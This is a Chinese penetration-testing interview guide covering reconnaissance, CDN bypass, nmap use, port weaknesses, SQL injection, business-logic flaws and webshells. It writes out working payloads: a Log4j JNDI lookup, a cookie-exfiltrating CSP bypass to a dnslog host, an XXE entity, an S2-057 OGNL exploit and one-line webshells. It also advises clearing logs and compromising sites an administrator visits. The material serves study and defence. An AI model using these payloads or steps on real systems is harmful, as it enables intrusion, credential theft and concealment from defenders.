# 1.信息搜集等

## 一.拿到一个待检测的站或给你一个网站，在已拿到授权的前提下，你会怎么做？（重点）

a.信息收集

1.首先获取到域名信息后，通过查询域名的whois信息，看是否能获取到注册者邮箱姓名电话等信息，放入社工库看是否存在密码泄露，可以通过泄露的密码进行后台登录，利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯。利用已有信息生成专用字典。

2.通过域名信息查找域名所属的公司信息，通过企查查和爱企查，查找到公司信息，收集该公司人员邮箱电话信息，微信公众号，qq群，谷歌语法找相关pdf，xlsx查看工号，姓名，公开笔记（语雀等），利用该公司的信息生成专用的密码字典，方便后续的后台登录尝试和越权漏洞尝试

3.查询服务器的旁站和子域名站点，一般主站的防护性比较完善，所有看看旁站和子域名下是否有通用性的cms或者其他信息泄露等漏洞

4.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞 

5.查看服务器的提供商，各类的云，各类的waf，vpn的设备是什么，现在的供应链是新的一个渗透方向

(供应链是什么？

供应链攻击也称为第三方攻击或后门漏洞，当黑客通过向该组织提供软件服务的第三方合作伙伴或供应商渗透企业系统时，就会发生供应链攻击。它被称为供应链攻击，因为攻击发生的漏洞点是软件供应链，比如说是

a.  奇安信vpn存在未授权管理用户遍历及任意账号密码修改

b.  log4j2核弹级别漏洞，针对的是开源日志组件Apache的漏洞等

c.  阿里云如果存在漏洞，假如该站点是通过阿里云搭建的，通过阿里云漏洞就可以拿下整个网站)

6.查询网站的真实IP地址，首先判断该网站是否存在cdn.waf，如果存在cdn，绕过cdn找到网站的真实IP地址，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。

1) cdn回答就是cdn如何绕过方法
2) waf的话通过一个叫wafwOOf的python脚本识别，然后再针对绕过 

7.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针 .google hack 进一步探测网站的信息，后台，敏感文件。

8.敏感信息收集，如 github 源码.用 7kb.破壳扫源代码泄露（.hg..git.cvs.svn..DS_store源代码泄露）.google hack.接口信息泄露.社工信息泄露.邮箱地址信息收集.网盘搜索.钟馗之眼.天眼查.威胁情报.微步在线等

b.漏洞扫描

用 AWVS.APPSCAN.nessus等扫描器检测 Web 漏洞，如 XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等

c.漏洞利用

利用以上的方式拿到 webshell，或者其他权限

d.权限提升

提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，

如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权

e.日志清理

操作系统.中间件.数据库等日志进行清除

f.总结报告及修复方案

整理渗透测试过程，发现漏洞过程.利用漏洞过程.漏洞是怎么产生的以及漏洞的修复方式。

## 二.渗透测试过程中，都进行哪些信息收集（重点）

1. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 
2. 网站指纹识别（包括，cms，cdn，证书等），dns记录 
3. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）
4. 子域名收集，旁站，C段等
5. google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等
6. 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等
7. 传输协议，通用漏洞，exp，github源码等

## 三.什么是cdn，如何检测cdn，如何绕过cdn（重点）

### 什么是cdn

CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡.内容分发.调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。

其原理如下：某些大型网站在全国都会有很多用户，这些用户常常会向网站发送不同的请求，那么不同地域会具有不同的缓冲服务器来接收用户发送的流量。如果用户发送流量没有任何交互的数据，只是请求首页的话，此时根据用户所在地区来确定访问的高速缓存服务器，高速缓存服务器会返回对应的响应到用户的浏览器当中，比如广东。

CDN的优势：隐藏源主机IP，降低延迟，提高服务响应速度，增加网络冗余，减小主机服务器压力。只有当用户填写数据，需要交互时才会将请求发送到真实的服务器；此时通过广东省的缓存服务器来连接真实服务器。CDN通常存在用户很多的大型流量网站，通过它来解决服务器的瓶颈。

### 验证目标是否存在挂载CDN：

- 多地ping，查看IP是否一样；
- IP反查域名；
- nslookup查询；
- 在线IP查询 http://tool.chinaz.com/nslookup

### CDN绕过

- 内部邮箱源：收集到内部邮箱服务器IP地址
- 网站phpinfo文件：phpinfo.php
- 分站IP地址，查询子域名：CDN很贵，很有可能分站就不再使用CDN
- App.小程序查询，如果目标网络站有自己的App 可以尝试通过利用fiddler或Burp Suite抓取App的请求，从里面找到目标的真实ip。
- 国外访问：https://asm.ca.com/en/ping.php
- 查询域名解析记录：https://viewdns.info/
- 网络空间引擎搜索法，常见的shodan，fofa，ZoomEye搜索。以fofa为例，只需输入：host=”XXX.com“就可以找出fofa收录的有这些关键字的ip域名，有时能获取网站的真实ip。

通过上面的方法获取了很多的IP地址，此时利用IP地址对Web站点进行访问，如果正常则说明是真实IP，否则为假。

## 四.旁站和C段的区别（重点）

旁站：同服务器其他站点；

C段：同一网段其他服务器，主站防护较强，转变目标到该站点的旁站。拿旁站权限，提权拿服务器权限。主站权限自然拿到；网站不存在旁站，进行C段探测（有些网站买断了相邻的几个IP做为分站，如果拿到分站的管理员敏感信息，如密码之类的，可以尝试对主站进行撞库）

## 五.敏感信息收集都收集哪些信息（重点）

- 后台目录：弱口令，万能密码，爆破；
- 安装包：获取数据库信息，甚至是网站源码；
- 上传目录：截断.上传图片马等；
- mysql管理接口：弱口令.爆破，万能密码；
- 安装页面 ：可以二次安装进而绕过；
- phpinfo：配置信息暴露出来；
- 编辑器：fck.kind.等
- robots.txt文件；crossdomain.xml；sitemap.xml；xx.tar.gz；xx.bak
- 源码泄露.GitHub信息泄露.社工信息泄露.邮箱信息泄露
- 相关网站查询公开信息

## 六.常见的网站服务器有哪些（中间件）（重点）

IIS.Apache.nginx.Tomcat.Weblogic.Jboss.Lighttpd

（Lighttpd是一个轻量级的Web 服务器，支持FastCGI, CGI, Auth, 输出压缩(output compress), URL重写, Alias等重要功能。它具有非常低的内存开销，cpu占用率低，效能好，以及丰富的模块等特点。其静态文件的响应能力远高于Apache，可谓Web服务器的后期之秀。）

## 七.判断出网站的 CMS 对渗透有什么意义？（重点）

1.漏洞利用：不同的CMS可能存在各种已知的漏洞和安全问题。通过了解目标网站所使用的CMS，渗透测试人员可以针对该CMS的特定漏洞进行深入研究和开发攻击脚本。这样做可以提高成功渗透的机会。

2.信息收集：CMS的版本信息以及插件.主题等扩展的存在与否都可能成为渗透测试的关键信息。确定网站使用的CMS有助于收集更准确的目标信息，并为后续测试活动提供更多的线索。

3.自动化工具选择：根据CMS的类型，可以选择特定的自动化渗透测试工具来加速测试过程。一些工具专门针对特定CMS设计，可以自动识别和利用其中的漏洞，有效地进行批量测试。

4.cms搭建的网站,可以通过指纹识别后,直接去百度搜索已经曝光的方法打一波nday ,例如：

wordpress后台修改模板拿webshell 

phpmyadmin mysql log日志写shell

dedecms织梦通过文件管理器上传webshell

Drupal 存在SQL 注入漏洞

## 八.Burpsuite和wireshark的区别？

Burpsuite在抓包上侧重请求和响应的数据.Wireshark侧重于数据帧

BP http/https包.wireshark 全流量包

都是最常用一些网络抓包的工具，它们都是基于网络协议来进行嗅探信息的。不同的是，wireshark是基于较大范围的网络信息的抓取，而且他侧重于数据的整理，而burpsuite则是较有针对性的信息攻击，他的数据报文修改比较适合在网络传输中进行渗透的操作。

## 九.一个成熟并且相对安全的 CMS，渗透时扫目录的意义？

敏感文件.二级目录扫描，站长的误操作等，比如：网站备份的压缩文件.说明.txt.二级目录可能存放着其他站点。

十.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？

- 丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。
- 用邮箱做关键词进行丢进搜索引擎。
- 利用搜索到的关联信息找出其他邮进而得到常用社交账号。
- 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。
- 利用已有信息生成专用字典。
- 观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。

## 十一.你平时常去那些网站进行学习.挖漏洞提交到那些平台

一般去 seebug.freebuf.吾爱破解.看雪论坛.阿里聚安全.PentesterLab.阿里云先知社区.四叶草安全等。

挖洞一般提交给 360 补天.cnvd.教育漏洞平台.漏洞银行.wooyun.漏洞盒子众测平台。

## 十二.你经常使用哪些工具来进行渗透测试（重点）

web漏扫：awvs.appscan.nessus

系统扫描：nessus.nmap

目录扫描：御剑.dirb

子域名扫描：Layer.7kbscan

漏洞利用：sqlmap.beef

webshell管理工具：菜刀.蚁剑.冰蝎.哥斯拉

其他工具：Wireshark.burpsuite

## 十三.burpsuite都有哪些模块

主要模块介绍:

HTTP代理— 它作为一个 Web 代理服务器运行，并且位于浏览器和目标 Web 服务器之间。这允许拦截.检查和修改在两个方向上通过的原始流量。

Scanner(扫描器)— 一个 Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。

Intruder(入侵)— 此工具可以对 Web 应用程序执行自动攻击。该工具提供了一种可配置的算法，可以生成恶意 HTTP 请求。Intruder 工具可以测试和检测 SQL 注入.跨站脚本.参数篡改和易受蛮力攻击的漏洞。

Spider(蜘蛛)— 一个自动抓取 Web 应用程序的工具。

Repeater(中继器)— 一个可以用来手动测试应用程序的简单工具。它可以用于修改对服务器的请求，重新发送它们并观察结果。

Decoder(解码器)— 一种将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。它能够利用启发式技术智能识别多种编码格式。

Comparer(比较)— 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。

Extender(扩展)— 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能

Sequencer(会话)— 一种分析数据项样本随机性的工具。它可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌.密码重置令牌等。

## 十四.NMAP的主要功能有哪些.扫描的几种方式.绕过ping扫描。（重点）

nmap的主要功能有：主机发现（参数 -sn）.端口扫描（-sT.-sU）.版本侦测（-sV）.操作系统侦测（-O）

nmap扫描基本场景

1.使用TCP SYN发现活跃主机

nmap -PS 192.168.1.0/24

2.使用TCP方式扫描端口

nmap -sS -sV -n -p1-65535 -oX tcp.xml 192.168.1.0/24

3.使用UDP方式扫描端口

nmap -sS -sU -n -p1-65535 -oX udp.xml 192.168.1.0/24

4.判断操作系统

nmap -O 192.168.1.0/24

5.判断服务版本

nmap -sV 192.168.1.0/24

扫描方式

-sT：TCP connect()扫描，这是最基本的TCP扫描方式。connect()是一种系统调用，由操作系统提供，用来打开一个连接。如果目标端口有程序监听， connect()就会成功返回，否则这个端口是不可达的。这项技术最大的优点是，你勿需root权限。任何UNIX用户都可以自由使用这个系统调用。这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。 

-sS：TCP同步扫描(TCP SYN)，因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回应。如果对方返回SYN|ACK(响应)包就表示目标端口正在监听；如果返回RST数据包，就表示目标端口没有监听程序；如果收到一个SYN|ACK包，源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上有我们的操作系统内核自动完成的。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包。

-sU：UDP扫描，发送0字节UDP包，快速扫描Windows的UDP端口如果你想知道在某台主机上提供哪些UDP(用户数据报协议,RFC768)服务，可以使用这种扫描方法。nmap首先向目标主机的每个端口发出一个0字节的UDP包，如果我们收到端口不可达的ICMP消息，端口就是关闭的，否则我们就假设它是打开的。

-sP：ping扫描，有时你只是想知道此时网络上哪些主机正在运行。通过向你指定的网络内的每个IP地址发送ICMP echo请求数据包，nmap就可以完成这项任务。注意，nmap在任何情况下都会进行ping扫描，只有目标主机处于运行状态，才会进行后续的扫描。如果你只是想知道目标主机是否运行，而不想进行其它扫描，才会用到这个选项。

-sA：ACK扫描 TCP ACK扫描，当防火墙开启时，查看防火墙有未过虑某端口，这项高级的扫描方法通常用来穿过防火墙的规则集。通常情况下，这有助于确定一个防火墙是功能比较完善的或者是一个简单的包过滤程序，只是阻塞进入的SYN包。这种扫描是向特定的端口发送ACK包(使用随机的应答/序列号)。如果返回一个RST包，这个端口就标记为unfiltered状态。如果什么都没有返回，或者返回一个不可达ICMP消息，这个端口就归入filtered类。注意，nmap通常不输出unfiltered的端口，所以在输出中通常不显示所有被探测的端口。显然，这种扫描方式不能找出处于打开状态的端口。

绕过ping扫描

-P0：nmap扫描前不Ping目标主机。在扫描之前，不必ping主机。有些网络的防火墙不允许ICMP echo请求穿过，使用这个选项可以对这些网络进行扫描。

nmap -P0 192.168.1.0/24

扫描结果端口状态说明

- open：目标端口开启。
- closed：目标端口关闭。
- filtered：通常被防火墙拦截，无法判断目标端口开启与否。
- unfiltered：目标端口可以访问，但无法判断开启与否。
- open | filtered：无法确定端口是开启还是filtered。
- closed | filtered：无法确定端口是关闭还是filtered。

## 十五.常用的端口都有哪些漏洞

| 端口号            | 服务                                     | 弱点                                                         |
| ----------------- | ---------------------------------------- | ------------------------------------------------------------ |
| 21                | FTP                                      | 匿名上传.下载，弱口令爆破                                    |
| 22                | SSH                                      | 弱口令爆破，SSH隧道及内网代理转发，文件传输                  |
| 23                | Telnet                                   | 弱口令爆破，嗅探                                             |
| 25                | SMTP                                     | 邮件伪造                                                     |
| 53                | DNS域名系统                              | 允许区域传送.DNS劫持.缓存投毒.欺骗                           |
| 67,68             | DHCP                                     | DHCP劫持.欺骗                                                |
| 80-90             | WEB                                      | 常见web漏洞以及是否为一些管理后台                            |
| 110               | POP3协议                                 | 爆破.嗅探                                                    |
| 111               | NFS                                      | 是否匿名访问                                                 |
| 139               | Samba服务                                | 爆破.未授权访问.远程代码执行                                 |
| 143               | IMAP协议                                 | 爆破                                                         |
| 161               | SNMP                                     | 弱口令爆破.搜集目标内网信息                                  |
| 389               | LDAP目录访问协议                         | 是否匿名访问，注入允许，弱口令                               |
| 443               | OpenSSL                                  | 心脏滴血以及一些web漏洞测试                                  |
| 445               | SMB                                      | 弱口令爆破，检测是否有ms_08067或者ms17_010等漏洞             |
| 512,513,514       | Rexec                                    | 爆破.Rlogin登陆                                              |
| 873,875           | Rsync                                    | 主要看是否支持匿名，也可以跑弱口令，还有rsync 未授权访问漏洞 |
| 1025              | RPC                                      | NFS匿名访问                                                  |
| 1099              | JAVArmi                                  | 远程命令执行,rmi反序列化漏洞                                 |
| 1352              | Lotus domino邮件服务端口                 | 可能存在弱口令.信息泄露                                      |
| 1433              | MSSQL                                    | 注入.提权.SA弱口令.爆破                                      |
| 1521              | Oracle                                   | 弱口令爆破.TNS爆破.注入.反弹Shell                            |
| 1900              | bes                                      | bes默认管理后台                                              |
| 2049              | NFS                                      | 可能存在NFS配置不当                                          |
| 2082,2083         | cpanel主机管理系统登陆                   | 弱口令爆破                                                   |
| 2181              | ZooKeeper监听端口                        | 可能存在  ZooKeeper未授权访问漏洞                            |
| 2222              | DA虚拟主机管理系统登陆                   | 弱口令爆破                                                   |
| 2375              | Docker                                   | 可能存在 Docker未授权访问漏洞                                |
| 2601,2604         | zebra路由                                | 默认密码zebra                                                |
| 3128              | squid代理默认端口                        | 匿名访问，可能漫游内网                                       |
| 3306              | MySQL                                    | 弱口令.提权.爆破                                             |
| 3311,3312         | kangle主机管理系统登陆                   | 说明                                                         |
| 3389              | 远程桌面服务                             | 弱口令，输入法漏洞，shirt后门，找放大镜，CVE-2019-0708  远程桌面漏洞，ms12-020 |
| 3690              | SVN                                      | 可能存在SVN泄漏，未授权访问漏洞                              |
| 4440              | rundeck                                  | 参考漏洞: 借用新浪某服务成功漫游新浪内网                     |
| 4750              | BMC                                      | 可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)  |
| 4848              | ClassFish                                | web中间件，弱口令admin/adminadmin                            |
| 5000              | SysBase/DB2数据库                        | 可能存在爆破.注入漏洞                                        |
| 5432              | PostgreSQL数据库                         | 弱口令爆破.注入漏洞                                          |
| 5560,7778         | iSqlPlus                                 | VNC访问                                                      |
| 5632              | PyAnywhere                               | 可能存在代码执行漏洞                                         |
| 5900,5901,5902    | VNC                                      | 弱口令爆破，可能存在VNC未授权访问漏洞，拒绝服务攻击（CVE-2015-5239），权限提升（CVE-2013-6886） |
| 5984              | CouchDB                                  | 可能存在 CouchDB未授权访问漏洞                               |
| 6082              | varnish                                  | 参考WooYun:  Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 |
| 6379              | redis数据库                              | 一般无认证，可直接访问，可能存在Redis未授权访问漏洞          |
| 6390              | Svn服务                                  | Svn泄露.未授权访问                                           |
| 7001,7002         | Weblogic                                 | 默认弱口令，可能存在Weblogic反序列化漏洞                     |
| 7778              | Kloxo                                    | Kloxo主机控制面板登录                                        |
| 8000-9090         | WEB                                      | 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 |
| 8069              | Zabbix                                   | 可能存在Zabbix弱口令导致的Getshell漏洞                       |
| 8080              | Tomcat                                   | 默认弱口令，Tomcat版本漏洞，低版本的utf8  directory traversal可以读取任意文件 |
| 8080,8089,9090    | JBOSS                                    | 后台可能不认证，JBOSS版本漏洞,也可弱口令，未授权访问漏洞     |
| 8083              | Vestacp                                  | 主机管理系统 （国外用较多）                                  |
| 8089              | Jetty.Jenkins                            | 可能存在反序列化，控制台弱口令等漏洞                         |
| 8161              | Apache ActiveMQ                          | 可能存在CVE-2016-3088漏洞，默认口令密码为：admin:admin，Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088） |
| 8649              | ganglia                                  |                                                              |
| 8888              | amh/LuManager                            | 主机管理系统默认端口                                         |
| 9000              | fcgi                                     | fcgi php执行                                                 |
| 9001              | Supervisord                              | 可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)          |
| 9043/9090         | websphere                                | 内存泄露,可能存在WebSphere反序列化漏洞                       |
| 9200/9300         | elasticsearch                            | 代码执行,可能存在 Elasticsearch未授权访问漏洞                |
| 9090              | WebShphere控制台                         | Java反序列化.弱口令                                          |
| 10000             | Virtualmin/Webmin 服务器虚拟主机管理系统 | 可能存在弱口令                                               |
| 10001/10002       | JmxRemoteLifecycleListener               | 可能存在Tomcat反序列化漏洞(CVE-2016-8735)                    |
| 11211             | Memcache                                 | 未授权访问                                                   |
| 27017,27018       | Mongodb                                  | 未授权访问                                                   |
| 28017             | mongodb                                  | 统计页面                                                     |
| 50000             | SAPManagement  Console                   | 远程代码执行                                                 |
| 50030,50060,50070 | HaDoop                                   | 未授权访问                                                   |

 

# 2.sql注入.业务逻辑漏洞等

## 一.Sql注入部分（重点）

### 1.Dnslog除了可以用于sql注入盲注回显外，还可以用到什么地方？

#### l 远程命令执行rce的盲打

Log4j2的poc

pyload:

```bash
cores?action=${jndi:ldap://${sys:java.version}.i913n8.ceye.io}
```



#### l Xss的盲打

```bash
<img src=http://test.x7sfjd.dnslog.cn/hguone>
```



#### l CSP绕过 利用dns预解析绕过

Payload：

```bash
document.querySelector('body').innerHTML += "<link rel='dns-prefetch' href='" + window.btoa(document.cookie.split(/;|=/)[1]) + ".your-dnslog.com'>"
```



#### l XXE的盲注利用

XXE盲打（无回显）验证，引用外部实体，可以利用dnslog在平台获取所需要的信息。

曾经用burp自带的Collaborator client利用bp自带的dnslog平台获得xxe盲注的回显。

```bash
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a8500b90361c04dc0f44fbe0106009f.web-security-academy.net/exploit"> %xxe;]>
```

#### l SSRF的盲打

一个没有回显的 SSRF 场景，我们同样可以通过 DNSLog 知道是否存在漏洞

example:

[http://127.0.0.1:81/sql.php?url=http://ssrf.ro8bpi.dnslog.cn](http://127.0.0.1:81/sql.php?url=http:/ssrf.ro8bpi.dnslog.cn，如果得到了解析记录，则证明有ssrf)

[如果得到了解析记录，则证明有ssrf](http://127.0.0.1:81/sql.php?url=http:/ssrf.ro8bpi.dnslog.cn，如果得到了解析记录，则证明有ssrf)

## 二.PHP的md5绕过

### 1.说说php md5绕过的集中方式（重点）

#### （1）弱比较 0e绕过

0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0

 比如将两个md5值进行弱类型比较

md5('QNKCDZO') == md5(240610708)

MD5加密后会变成这个样子

0e830400451993494058024219903391 == 0e462097431906509019562988736854

由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样

0 == 0

#### （2）数组绕过

md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null

比如将两个数组的md5值进行比较

md5(a[]=1) === md5(b[]=1)

由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样

null === null

结果返回true,也就是说数组的md5值进行比较时,结果相等

需要注意的是0e绕过只能绕过弱类型比较(`==`),而数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(===)

#### （3）MD5碰撞绕过

很难

### 2.数据库的万能密码都有那些？

（1）`' or 1=1 --+`

（2）ffifdyop 的MD5加密结果是 276f722736c95d99e921722cf9ed621c

经过MySQL编码后会变成'or'6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密

## 三.其他

### 1.描述下s2-057漏洞（重点）

当web应用中使用了Struts2 Convention插件时，alwaysSelectFullNamespace属性值是会开启的。

开启alwaysSelectFullNamespace属性

在`org.apache.struts2.dispatcher.mapper.DefaultActionMapper#parseNameAndNamespace`方法中解析uri时，

如果alwaysSelectFullNamespace属性值为true，会进入到能执行命令的分支，就可以利用漏洞远程执行命令

### 2.s2-057漏洞存在需要有两个必要条件：（重点）

1. alwaysSelectFullNamespace属性值为true
2.  2..存在缺省namespace的package，或namespace使用了通配符（如“/*”）

### 3.s2-057流量关键字

Ognl

Poc（exp）：

```bash
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```



## 四.业务逻辑漏洞

### 1.挖洞的过程中遇到比较多的漏洞是什么？

文件上传漏洞，特别是头像上传的地方比较容易有文件上传漏洞

Sql注入漏洞，头注入有时候会遇到

再有就是很大量的逻辑漏洞啦，比如越权，支付逻辑漏洞，等等

### 2.说说你曾经挖出来的逻辑漏洞（重点）

（1）比较多是只做客户端验证

使用BP等工具进行抓包篡改数据，便很容易绕过客户端控件的检查，进行恶意数据的输入。

(2) 验证码过于简单可以爆破

(3) 边界值的一些缺陷，比如重要变量溢出的一些情况。

(4) 业务流程有问题，导致可以通过数据包的改动或者丢弃，实现鉴权的绕过，金额的修改等等

### 3.常见逻辑漏洞有哪些？（重点）

①　未授权访问

②　验证码绕过

③　密码找回

④　密码修改

⑤　登录页面用户覆盖

⑥　支付漏洞

⑦　水平越权

⑧　垂直越权

⑨　交叉越权

⑩　突破限制 

### 4.什么是越权漏洞？

用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。

分为水平越权和垂直越权

如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。

一般越权漏洞容易出现在权限页面(需要登录的页面)增.删.改.查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。

### 5.有哪些分类？

分为水平越权和垂直越权

水平越权：A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作。

垂直越权：A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。

### 6.如何进行防护越权漏洞？

①　前后端同时对用户登录输入信息等进行检测

②　对用户输入可控参数进行严格校验，防止攻击者枚举

③　对统一ip设置访问次数限制

④　添加验证码校验，短信校验等，同时对验证码重发时间进行限制

⑤　执行关键操作前必须验证用户身份，验证用户是否具备操作数据权限

⑥　特别敏感操作可以让用户再次输入密码或其他的验证信息

⑦　可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session.cookie 中加入不可预测.不可猜解的 user 信息

### 7.越权漏洞测试方法思路

确认业务流程--->寻找流程中可以被操控的环节--->分析其中可产生的逻辑问题--->尝试修改参数进行触发

### 8.常见越权功能点：

（1）根据订单号ID查订单.

（2）根据用户 ID 查看帐户信息.修改 / 找回密码等。 

（3）手机号码

（4）商品ID

### 9.登录处存在的逻辑漏洞有哪些？

(1) 采用弱密码或者无密码进行登录（弱口令）

(2) 密码可爆破

(3) 验证码可爆破

(4) 短信轰炸

(5) 手机验证码凭证可查看(后端返回包可能包含验证码信息)

(6) 万能验证码（1.任意验证码复用2.测试方便遗留下得万能验证码0000/1111/6666）

(7) 前端验证登录结果（修改返回包内容）

(8) 任意用户密码找回/重置

(9) 用户批量注册

(10) 登录成功凭证可以复用（使用登录成功的凭证，任意登录其他用户）

### 10.支付漏洞有哪些？

(1) 修改支付价格(购买商品一般分为三步骤：订购.确认信息.付款 ,每一步骤其修改的金额值你可以尝试小数目或者尝试负数 )

(2) 修改支付状态

(3) 修改购买数量

(4) 修改附属值 （可以修改优惠卷得金额.修改积分得金额）

(5) 修改支付得接口

(6) 多重替换支付（两个订单，将金额少的订单和金额多的做替换，可以将高价值得物品通过低金额购买）

(7) 多线程并发问题 

### 11.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用

先爆破用户名，再利用被爆破出来的用户名爆破密码。其实有些站点，在登陆处也会这样提示。

### 12.密码找回漏洞可以通过哪些方式进行绕过？

1) 密码允许暴力破解.
2) 存在通用型找回凭证.
3) 可以跳过验证步骤.
4) 找回凭证可以拦包获取
5) 等方式来通过厂商提供的密码找回功能来得到密码。


![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image002.jpg)

# 3.owasp各种常见漏洞

## 一.php反序列化漏洞

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image002-1733805549289-3.jpg)

 

### 1.PHP反序列化漏洞产生原因？与防范？

原因：序列化与反序列化的过程用户可控

防范：

控制用户可输入点，进行过滤添加白名单验证

不允许用户控制unserialize函数的参数 

避免危险函数带入到魔法函数里面

在情况允许的条件下不要让反序列函数可以被用户输入控制，尽量写死，或者用同功能函数进行替换

### 2.PHP反序列化漏洞绕过方式（重点）

利用魔术方法进行绕过，对序列化后字符串进行逃逸闭合，进行pop链构造，利用函数间关系实现利用目的

### 3.PHP反序列化在代码审计中如何进行挖掘，有哪些关键函数？（重点）

serialize()unserialize()以及常见的魔术方法，比如__sleep().__wakeup() .__toString().__call().__invoke()等



## 二.Webshell上传及管理工具，流量分析等

### 1.什么是webshell？

webshell就是以 asp.aspx.php.jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。

### 2.通过webshell可以获得哪些用户权限？（重点）

1.网站后台执行权限：如对文件进行上传下载等

2.后端代码执行权限：对对方服务器进行后端操作,操作数据库文件，移动服务器文件等。

### 3.常见的一句话木马

```bash
php ：<?php @eval($_POST[value]); ?>
asp ：<%eval request ("value")%> 或 <% execute(request("value")) %>  
aspx：<%@ Page Language="Jscript" %> <% eval(Request.Item["value"]) %>
jsp :<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### 4.木马分类

大马，小马，一句话木马，图片马，内存马，无文件马

### 5.上传大马后访问乱码时，有哪些解决办法？

浏览器中改编码

### 6.冰蝎.哥斯拉这些工具有没有了解过吗？他们有哪些明显流量特征(重点)

经过webshell传输加密过的数据包，比正常数据包长度长

蚁剑：

（1）每个请求体都由以下数据开始@ini_set("display_errors", "0");@set_time_limit(0); 

（2）响应包，都是明文

菜刀：

（1）菜刀伪造User-Agent为爬虫文件

（2）请求体中存在QGl开头固定字符

```bash
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J
```

冰蝎：

（1）特征字段：Accept: application/json, text/javascript, */*; q=0.01

哥斯拉：

（1）cookie处为PHPSESSID=k162v3u8q6fmbhgbgv2lvtdvs1;结尾处有一个； 正常请求cookie结尾是没有分号

（2）数据包长度达万个

（3）请求包Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
 响应包Cache-Control: no-store, no-cache, must-revalidate, 

（4） 编码连接特征 eval base64decode开头

### 7.手动查杀病毒流程？

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image004.jpg)

### 8.查杀病毒可以使用的工具有哪些？

Windows ： 火绒 .D盾（http://www.d99net.net）

Linux ：WebShellKiller

### 9.如何防御webshell攻击？

针对网页程序的上传功能进行严格限制，遵循最小授权原则。对数据库做好加固和备份.及时更新程序.定期更新用户名密码，保证密码复杂度，减少弱口令带来的危害。日常检测注意是否有多出的文件。到正规网站下载程序，避免下载有后门程序。

### 10.连接到webshell后，不管执行什么系统命令一直返回ret=127,是什么情况？（重点）

